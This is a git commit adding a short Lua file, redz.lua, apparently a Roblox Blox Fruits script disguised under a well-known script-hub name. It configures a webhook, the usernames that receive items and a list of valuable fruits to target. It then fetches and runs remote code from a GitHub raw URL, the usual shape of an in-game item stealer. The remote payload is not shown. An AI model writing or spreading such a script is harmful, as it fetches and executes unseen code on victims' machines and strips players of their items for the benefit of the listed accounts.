78360c10cc24e41eec62006efca01fd2605dc4b5
SatoshiNakamura17 <juviemarts@gmail.com>
2025-04-08 21:41:52 +0800

    Update and rename Redz.lua to redz.lua

---
+++ redz.lua
@@ -0,0 +1,6 @@
+Webhook =
+    "https://webhook-protect.vercel.app/api/webhook?id=ZUNua2xnbDFsdkdBU0RDb3NPWW5jZzpPV1p2di1obGFLaEJCWURlTkY0ZE0wUXpHRmVOVTItUnBJc3g2dnlYM3BIRmdaQWxYN3YzbnRKVEpXNlRkOEFzYjFsOThEZVFFZVlyUHdEZG5scV9CY0RmMEdxYjJjX0JrSWxndWRVMGV6XzVGX3VnUjF3QVpXbzMtMF9vN29WSWZta3M2b05MaHJuVldSYk1GV0hzOHA1NVlpdXA4eVQtSzlfbEJYUThEaHM" -- << Your Webhook
+Usernames = {"IPHIPACMAN123", "somealtuserhere2"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dragon-Dragon"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
